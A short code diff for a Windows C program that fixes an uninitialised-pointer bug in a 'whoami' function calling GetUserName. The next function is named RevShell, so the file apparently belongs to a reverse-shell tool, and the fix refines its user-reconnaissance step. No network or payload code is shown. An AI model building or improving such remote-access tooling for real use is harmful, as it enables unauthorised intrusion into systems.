@@ -11,9 +11,7 @@ void whoami(char *returnval, int returnsize)
 {
 	DWORD bufferlen = 257;
 	// Call WINAPI method, assign it's response to returnval pointer.
-	LPSTR ami;
-	GetUserName(ami, &bufferlen);
-	returnval = ami;
+	GetUserName(returnval, &bufferlen);
 }
 
 void RevShell()
